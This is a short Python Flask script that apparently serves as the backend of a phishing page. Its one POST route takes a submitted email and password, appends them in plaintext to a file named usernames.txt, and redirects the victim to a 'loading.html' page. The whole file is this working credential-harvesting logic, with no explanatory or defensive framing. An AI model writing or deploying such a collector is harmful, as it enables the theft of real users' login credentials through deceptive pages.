from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/post.py', methods=['POST'])
def handle_post():
    if request.method == 'POST':
        
        email = request.form.get('email', '')
        password = request.form.get('password', '')

        
        with open("usernames.txt", "a") as handle:
            handle.write(f"Email: {email}, Password: {password}\n")

        
        return redirect("loading.html", code=302)

if __name__ == '__main__':
    app.run(debug=True)
